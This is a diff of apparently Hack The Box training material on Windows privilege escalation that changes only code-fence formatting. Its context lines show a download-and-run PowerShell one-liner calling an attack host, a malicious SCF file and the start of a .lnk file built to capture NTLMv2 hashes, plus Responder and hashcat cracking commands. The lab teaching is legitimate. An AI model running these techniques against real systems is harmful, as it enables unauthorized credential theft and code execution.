@@ -26,8 +26,7 @@ Also, suppose our client positions us on an attack machine within the environmen
 
 When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
 
-```
-        shellsession
+```shellsession
 while($true)
 {
 
@@ -43,8 +42,7 @@ while($true)
 
 We can host the script on our attack machine and execute it on the target host as follows.
 
-```
-        powershell
+```powershell
 PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 
 
 InputObject                                           SideIndicator
@@ -76,8 +74,7 @@ A Shell Command File (SCF) is used by Windows Explorer to move up and down direc
 
 In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.
 
-```
-        shellsession
+```shellsession
 [Shell]
 Command=2
 IconFile=\\10.10.14.3\share\legit.ico
@@ -89,8 +86,7 @@ Command=ToggleDesktop
 
 Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo responder -w -v -I tun0
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -168,8 +164,7 @@ hiimeins@htb[/htb]$ sudo responder -w -v -I tun0
 
 We could then attempt to crack this password hash offline using `Hashcat` to retrieve the cleartext.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -214,8 +209,7 @@ Using SCFs no longer works on Server 2019 hosts, but we can achieve the same eff
 
 #### Generating a Malicious .lnk File
 
-```
-        powershell
+```powershell
 
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("C:\legit.lnk")
